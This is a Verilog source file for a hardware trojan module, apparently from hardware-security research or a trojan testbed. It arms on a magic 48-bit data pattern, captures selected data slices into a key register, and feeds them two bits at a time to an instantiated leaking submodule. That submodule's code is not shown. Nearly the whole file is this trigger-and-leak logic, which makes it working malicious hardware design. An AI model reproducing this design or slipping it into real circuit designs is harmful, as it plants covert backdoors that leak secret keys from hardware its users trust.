`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company: 
// Engineer: 
// 
// Create Date: 04/28/2023 02:33:03 PM
// Design Name: 
// Module Name: trojan_wrapper
// Project Name: 
// Target Devices: 
// Tool Versions: 
// Description: 
// 
// Dependencies: 
// 
// Revision:
// Revision 0.01 - File Created
// Additional Comments:
// 
//////////////////////////////////////////////////////////////////////////////////
//trojan function defined for leaking 2 bits at a time and all 256 bits in one go

`define bitleak 8
`define eq (4+2*`bitleak)
`define rd_dealy 3
module trojan_48_32(
input clk,rst_all,//rst_in,
input [63:0] data,
output out
    );
    

reg  en;
wire enable;
wire done;
reg [4:0] ctr;

reg [4*`bitleak-1:0] K;

wire rst = !en | done;
reg [2:0] sel;

//for en
always @(posedge clk) begin
    if(rst_all | done ) begin
        en<=0; sel<=0;
        end
    //else if(data==64'h000000000044ab93) begin //for 64-bit config
    else if(data[47:0]==48'h00000044ab93) begin  //for 48-bit config
    //else if(data[31:0]==32'h0044ab93) begin //for 32-bit config
        en<=1;
        sel<=data[50:48];
        end
    else begin
        en<=en; sel<=sel;
        end
end

always @(posedge clk) begin
    if(rst_all)
        ctr<=0;
    else if (en==1'b1)
        ctr<=ctr+1;
    else
        ctr<=ctr;
end

wire [`bitleak:0] data_w = sel==0 ? data[`bitleak-1:0] : 
                           sel==1 ? data[2*`bitleak-1:`bitleak]:
                           sel==2 ? data[3*`bitleak-1:2*`bitleak]:
                           sel==3 ? data[4*`bitleak-1:3*`bitleak]:
                           sel==4 ? data[5*`bitleak-1:4*`bitleak]:
                           sel==5 ? data[6*`bitleak-1:5*`bitleak]:
                           sel==6 ? data[7*`bitleak-1:6*`bitleak]:
                                    data[8*`bitleak-1:7*`bitleak];
//for K 
always @(posedge clk) begin
        case(ctr)
            9'd0:  begin K[1*`bitleak-1:0*`bitleak] <=data_w; K[4*`bitleak-1:1*`bitleak]<=K[4*`bitleak-1:1*`bitleak];                      end
            9'd1:  begin K[2*`bitleak-1:1*`bitleak] <=data_w; K[4*`bitleak-1:2*`bitleak]<=K[4*`bitleak-1:2*`bitleak]; K[1*`bitleak-1:0*`bitleak] <=K[1*`bitleak-1:0*`bitleak];  end
            9'd2:  begin K[3*`bitleak-1:2*`bitleak] <=data_w; K[4*`bitleak-1:3*`bitleak]<=K[4*`bitleak-1:3*`bitleak]; K[2*`bitleak-1:0*`bitleak]<=K[2*`bitleak-1:0*`bitleak]; end
            9'd3:  begin K[4*`bitleak-1:3*`bitleak] <=data_w; K[3*`bitleak-1:0*`bitleak] <=K[3*`bitleak-1:0*`bitleak];                       end           
            default: begin  K<={data[1:0],K[4*`bitleak-1:2]}; end
        endcase
end



assign enable = (en==1'b1 && ctr>=8'd4 && !done);
assign done = (ctr==`eq);

trojan tr(.enable(enable),.K(K[1:0]),.out(out));



endmodule

